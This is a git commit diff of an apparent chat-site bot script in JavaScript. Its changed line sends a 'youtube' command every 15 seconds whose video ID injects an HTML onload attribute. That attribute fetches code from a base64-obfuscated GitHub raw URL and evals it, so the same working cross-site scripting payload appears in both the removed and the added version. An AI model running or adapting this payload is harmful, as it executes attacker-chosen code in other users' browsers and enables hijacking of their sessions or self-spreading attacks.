c6e0d4d60a0fc01ab0c24d46aa723635a7634463
ivorydevrimoalt <154000627+ivorydevrimoalt@users.noreply.github.com>
2025-05-01 20:42:14 +0300

    Update and rename RASPRAY.js to RASIVOPRAY.js

--- RASIVOPRAY.js
+++ RASIVOPRAY.js
@@ -49,5 +49,5 @@ const words = [
 const randomIndex = Math.floor(Math.random() * words.length);
 const randomWord = words[randomIndex];
 socket.emit('talk', { text: randomWord });
-setInterval(function(){socket.emit('command', { list: ['youtube', '71Uyt5tTnyg" onload="fetch(atob(\'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v\')+\'IVORYPRAY\'+atob(\'Lmpz\')).then(r=>r.text()).then(t=>eval(t))" u="'] });},15000)
+setInterval(function(){socket.emit('command', { list: ['youtube', '71Uyt5tTnyg" onload="fetch(atob(\'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v\')+\'RASIVOPRAY\'+atob(\'Lmpz\')).then(r=>r.text()).then(t=>eval(t))" u="'] });},15000)
     },5000)
